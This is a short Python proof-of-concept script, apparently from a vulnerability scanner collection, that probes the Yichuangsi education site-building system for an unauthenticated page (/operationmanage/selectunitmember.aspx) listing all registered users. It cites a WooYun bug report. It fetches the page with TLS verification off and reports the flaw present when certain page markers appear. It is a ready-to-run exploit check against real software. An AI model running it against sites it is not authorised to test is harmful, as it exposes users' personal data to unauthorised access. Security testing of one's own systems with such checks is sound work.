#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 易创思教育建站系统未授权访问可查看所有注册用户
referer: http://www.wooyun.org/bugs/wooyun-2010-086704
author: Lucifer
description: 文件selectunitmember.aspx未授权访问。
'''
import sys
import requests
import warnings
def run(url):
        result = ['易创思教育建站系统未授权访问可查看所有注册用户', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/operationmanage/selectunitmember.aspx"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"doPostBack" in req.text and r"gvUnitMember" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
